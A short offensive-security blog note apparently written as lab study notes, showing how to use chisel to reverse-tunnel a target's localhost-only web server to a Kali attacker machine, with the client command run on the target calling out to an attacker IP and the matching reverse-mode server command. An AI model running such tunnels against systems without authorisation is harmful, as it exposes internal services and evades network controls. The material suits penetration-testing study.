---
layout: post
title: Chisel Localhost
titledate: 10/17/23
tags: ["infosec","offsec","chisel", "tunnel","http"]
---

#### tunneling localhost

if we have access to a target system and we recognize that the target has a local server running, perhaps a development web server, we can use chisel to tunnel that back to our attacking machine

we copy all chisel versions to the client 

    ./chisel client 192.168.45.183:9999 R:8090:127.0.0.1:8000
    
on the target i execute the client to port 9999 which is the server on the kali machine

i bind the localhost:8000 to 8090... not the target ip bc the target has an internal server bound to 127.0.0.1

then on the attacker - we bind the target localhost:8000 to my kali 8090

    chisel server -p 9999 --reverse
